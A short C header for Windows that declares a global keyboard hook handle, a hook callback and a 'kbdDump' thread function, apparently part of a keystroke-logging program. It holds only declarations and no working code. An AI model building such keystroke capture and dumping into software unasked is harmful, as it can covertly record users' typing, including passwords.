#ifndef KBDHANDLER_H
#define KBDHANDLER_H

#include <Windows.h>

#include "shared.h"

HHOOK Hook;

LRESULT CALLBACK _hookHandler(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI kbdDump();

#endif // KBDHANDLER_H